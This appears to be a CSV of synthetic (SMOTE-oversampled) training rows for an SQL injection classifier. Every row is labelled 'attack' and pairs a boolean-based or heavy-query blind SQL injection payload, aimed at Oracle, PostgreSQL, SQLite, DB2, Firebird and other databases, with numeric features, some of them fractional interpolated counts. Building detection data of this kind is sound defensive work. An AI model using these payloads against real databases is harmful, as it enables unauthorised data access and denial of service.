id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000029,attack,boolean,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000115,1.5234246175217963,148.8930031036674,32.45987616387528,4.114466558354358,69.91975232775056,18.0,40.97325077591685,20.0,0.4693952165687678,0.12097930782663902,0.27520402246388315,0.13442145314071002,0.48662538795842525,0.5133746120415748,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.0,0.48662538795842525,0.5133746120415748,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000030,attack,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000281,0.524440773604029,126.45801477420507,32.48600492473502,3.8086188962975545,42.0,21.0,48.45801477420507,15.0,0.3322603590524206,0.1661301795262103,0.38294504747407604,0.11866441394729306,0.7569975376324884,0.0,2.0,0.0,1.0,2.0,0.0,7.243002462367511,0.0,1.0,1.0,5.0,0.7569975376324884,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000031,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000072,0.5989151305285295,88.44510501417406,19.141354089620542,2.915270711496389,13.293229551897298,14.13083271696432,46.86916728303568,14.15187546227676,0.14967077207768217,0.1616017692464875,0.5295161764828209,0.15921128219300948,3.4345836415178397,0.0,0.0,0.0,0.8586459103794598,2.0,0.0,7.71729182075892,0.0,-1.1102230246251565e-16,0.1413540896205403,2.85864591037946,0.8586459103794598,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000032,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000124,0.6905726844097327,137.93192470323612,31.0,4.169405364860332,81.95461646882407,5.3030776458827145,35.0,15.674230588529321,0.5941007843123642,0.03807550326035093,0.2539805882400584,0.11384312418722636,3.325769411470679,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.674230588529321,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.32576941147067895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.325769411470679
SMOTE_000033,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000061,0.0551418852776331,128.37874476887504,30.039867870407896,4.123624581406424,72.13953754642765,4.079735740815796,35.15947148163159,17.0,0.5619999565573839,0.03171190453597583,0.27381782965232876,0.13247030925431147,0.0,3.019933935203949,0.0,0.0,1.0,1.0,0.0,4.039867870407897,0.9800660647960513,-1.1102230246251565e-16,2.980066064796051,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.019933935203948927,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.019933935203949
SMOTE_000034,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000176,1.1435461731713907,102.3863480140079,29.0,3.8930459504777106,45.70997937849042,10.922730397198421,33.33818431775874,12.415453920560317,0.4341281091019013,0.11100600820885845,0.33245919516383576,0.12240668752540453,0.0,0.0,2.0,0.0,1.0,1.0,0.0,5.169092158879368,0.0,0.5845460794396843,1.4154539205603156,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,boolean,-2100' where 9260  =  9260 or 3038  =  3038,nearest_attack_euclidean,R000054,0.5388087828226416,42.84762945712049,16.457111628638543,3.523496492720586,7.152370542879517,19.542888371361457,12.0,4.152370542879513,0.16700915124251148,0.455920050291325,0.28008219629820275,0.09698860216796079,1.0,0.0,1.1523705428795146,0.0,0.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,3.1523705428795146,1.0,0.0,0.1523705428795147,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.15237054287951468,0.8476294571204853,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000036,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",nearest_attack_euclidean,R000078,0.3116887717586453,122.45228821276909,33.0,3.814360547603865,41.26971761702545,15.0,48.0,18.182570595743638,0.33682017663524627,0.12252210943009267,0.39207075017629656,0.1485869637583645,6.0,0.0,0.0,1.0,0.0,2.0,0.0,8.0,0.1825705957436372,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000037,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000303,0.5121718774989117,141.83267612713487,40.0,4.0358550507945505,46.0,23.0,53.0,19.832676127134878,0.32434146199235214,0.16217073099617607,0.3736977714259709,0.13979003558550093,3.832676127134878,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000291,0.46939090987680115,138.49881792418248,38.33254528278832,3.9690639800154233,43.498817924182475,23.0,53.83372735860584,18.16627264139416,0.3140295869461062,0.1660770473709427,0.38874078567076537,0.1311525800121857,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,5.166272641394158,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.16627264139415876,0.0,1.0,0.0,0.8337273586058412,0.16627264139415876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1662726413941593
SMOTE_000039,attack,boolean,"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000311,1.1480528786040123,213.6498291268669,33.0,3.5871197333532505,56.0,27.0,93.1284249658859,37.52140416098098,0.2623234334951636,0.12647736972088247,0.4355516247399156,0.1756475720440383,0.9571916780380321,3.0428083219619677,0.0,0.0,0.0,2.0,0.0,19.521404160980982,2.0,1.0,3.0,8.0,0.23929791950950802,0.7607020804904919,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000040,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000085,0.6378372216328927,94.1790257609472,24.192134660355197,3.3166066406819112,22.5895128804736,13.0,44.192134660355194,14.3973782201184,0.23815092261691692,0.13894032677469717,0.4698534923173413,0.15305525829104463,0.0,3.9999999999999996,0.0,0.0,0.0,1.3013108899408004,0.0,7.3973782201184,0.0,0.6986891100591995,1.0,1.3013108899408006,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000041,attack,boolean,"1""   )    )    and 9198  =  9198--",nearest_attack_euclidean,R000213,1.5399675158034003,34.781311321063654,12.562622642127272,2.79545206804358,2.60934433946818,10.171966981595455,16.0,6.0,0.07546876926366608,0.2915155845463012,0.46037501541093284,0.17264063077909983,0.0,1.0,1.6093443394681817,0.0,0.0,1.0,0.0,2.0,0.39065566053181844,-1.1102230246251565e-16,0.0,2.6093443394681812,0.0,1.0,0.6093443394681817,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.6093443394681816,0.3906556605318184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000042,attack,boolean,"-1072%""   )    )    or 3090  =  3539",nearest_attack_euclidean,R000155,0.5332852506599047,36.58761426190297,15.146903565475741,2.998544505362497,2.0,12.0,16.58761426190297,6.0,0.05473942463624587,0.3284365478174752,0.4526057536375412,0.1642182739087376,0.14690356547574202,0.853096434524258,1.0,0.0,0.0,1.0,0.0,2.146903565475741,0.853096434524258,-1.1102230246251565e-16,0.0,2.0,0.14690356547574196,0.853096434524258,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000043,attack,boolean,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",nearest_attack_euclidean,R000087,0.6285727008430773,87.97671900217892,22.282388428882705,3.159156005000793,15.152834713351893,16.0,42.25910743106162,14.564776857765406,0.17298278085938984,0.1820920850168964,0.4795216902955918,0.16540344382812205,0.0,3.9999999999999996,1.0,0.0,0.2823884288827031,2.0,0.0,6.5647768577654055,0.0,-1.1102230246251565e-16,0.717611571117297,3.2823884288827028,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000044,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000113,0.23706379845454678,123.12594978049009,28.675569868294055,4.011359416356855,71.0,8.225189956098019,31.450379912196038,12.450379912196034,0.5768076394465731,0.06676555933910142,0.2553918875753662,0.1010349136389593,1.0,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.225189956098018,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,boolean,"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",nearest_attack_euclidean,R000182,0.9745307206284762,62.60734899305358,24.196325503473215,3.7464080075091557,13.791426174770834,19.40489932870238,21.20857382522917,8.20244966435119,0.22340596152190742,0.30914318839935584,0.3368920268074603,0.13055882327127646,1.0,0.0,2.0,0.0,0.0,2.0,0.0,2.2024496643511906,0.0,-1.1102230246251565e-16,0.6012248321755955,4.398775167824405,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.3987751678244047,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.398775167824405
SMOTE_000046,attack,boolean,"-4580"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dbhb""  =  ""dbhb",nearest_attack_euclidean,R000226,0.5961347904626103,369.3322337511111,32.33223375111113,3.442286810522648,102.22258874962962,49.33223375111113,165.0,52.77741125037038,0.27678378374511836,0.13356149053947686,0.44675735644058223,0.14289736927482252,0.0,3.9999999999999996,0.7774112503703781,0.0,0.0,3.0,0.0,34.0,0.0,-1.1102230246251565e-16,1.0,13.777411250370378,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.2225887496296222,0.7774112503703778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000047,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000205,2.3843511691176795,34.28047313094051,18.0,3.7003930207899383,10.48605223638608,10.654184329084178,9.691631341831645,3.4486052236386087,0.28905325155881556,0.33244173779172687,0.2767026918832505,0.10180231876620705,0.4486052236386079,0.0,0.551394776361392,0.0,0.0,1.0,0.0,0.44860522363860866,0.0,-1.1102230246251565e-16,0.0,1.5513947763613918,0.4486052236386079,0.0,0.0,1.0000000000000002,0.0,1.0,0.4486052236386079,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.44860522363860794,0.5513947763613921,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000048,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000259,0.761048530373317,138.87795955703686,31.0,4.148773392010928,81.48055255032664,8.301296496644891,34.39740700671022,14.698703503355109,0.5857226074662,0.060168581532183366,0.24811340903707246,0.10599540196454413,3.0961105100653263,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.301296496644891,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.6987035033551089,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.698703503355109
SMOTE_000049,attack,boolean,"1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R000064,0.6865047827440822,167.19322192903957,34.673823034408876,4.190679795414795,77.23616013549282,17.630884827955633,50.652353931182255,21.673823034408873,0.4573124105434432,0.10722788967570004,0.30526057029576337,0.13019912948509346,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.652353931182254,0.0,0.32617696559112674,1.6738230344088734,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000050,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,1.1678157151934534,147.06487426770536,33.08462482323923,3.8800815887217928,44.99012472223308,21.084624823239228,55.81099979798769,25.179124924245386,0.30529213349187245,0.14253070862492867,0.38038618848751565,0.1717909693956833,1.0,0.0,1.4527499494969225,0.0,0.0,1.7263749747484614,0.0,11.0,0.0,2.0,1.0,9.179124924245384,1.0,0.0,0.7263749747484614,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.7263749747484611,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7263749747484614
SMOTE_000051,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000096,0.077618332460532,94.78457161663096,28.0,3.58174093385094,32.0,13.323142575053584,38.56914323326188,10.89228580831547,0.3376223778458189,0.14063374234452614,0.40684440454004217,0.11489947526961283,0.0,0.0,0.0,0.0,1.0,1.0,0.0,6.892285808315471,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000173,1.827709725824774,105.6678659280264,27.40099568709195,3.8458999577583484,49.22428145449538,10.481194824510338,33.181692668056314,12.780696980964365,0.4522429261686254,0.09005631681556514,0.33114440597081535,0.1265563510449941,0.0,1.459900431290805,2.0,0.0,1.0,2.0,0.0,3.16039827483678,0.0,-1.1102230246251565e-16,1.08019913741839,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.459900431290805,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.459900431290805
SMOTE_000053,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000164,0.018851927417006198,172.89072503593718,33.98509886853689,3.829970549493316,59.93542843032651,16.0,66.96523069325274,29.990065912357927,0.34664416859818,0.09255247863664223,0.3873332439813548,0.1734701087838229,0.0,3.004967043821037,0.0,0.0,0.0,1.0049670438210374,0.0,14.985098868536888,0.9950329561789626,2.0,3.9850988685368876,5.0149011314631124,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,0.004967043821037409,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9850988685368876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.990065912357925
SMOTE_000054,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000124,0.10557325322467478,135.0584187129798,30.980527095673402,4.190632724614976,79.9610541913468,4.077891617306394,35.0584187129798,15.961054191346802,0.5920595179169852,0.03018151870555255,0.2595728325978518,0.1181861307796104,2.9610541913468027,0.0,0.0,0.0,1.0,1.0,0.0,4.019472904326599,0.0,-1.1102230246251565e-16,2.980527095673401,2.0,1.0,0.0,0.0,0.01947290432659874,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000055,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000205,0.11826212408906238,27.696499840446563,17.696499840446577,3.7899182406996457,5.757199872357262,12.0,6.939299968089323,3.0,0.20655682823497495,0.4342267110475793,0.2506597829555509,0.10855667776189482,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000056,attack,boolean,"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000311,1.143003998637571,213.66456242959254,33.0,3.586984033987393,56.0,27.0,93.14105351107929,37.523508918513215,0.2623047037284697,0.12646833929765505,0.4355817261506737,0.17564523082320155,0.9529821629735671,3.047017837026433,0.0,0.0,0.0,2.0,0.0,19.523508918513215,2.0,1.0,3.0,8.0,0.23824554074339171,0.7617544592566083,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000057,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000151,0.08518564155530095,70.67017569930559,26.736140559444475,3.695342867693671,11.736140559444472,16.0,28.0,14.93403513986112,0.16586083468392887,0.2264782733271683,0.39633697832254444,0.21132391366635842,4.0,0.0,1.0,0.0,0.0,2.0,0.0,4.0,2.0,0.9340351398611186,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
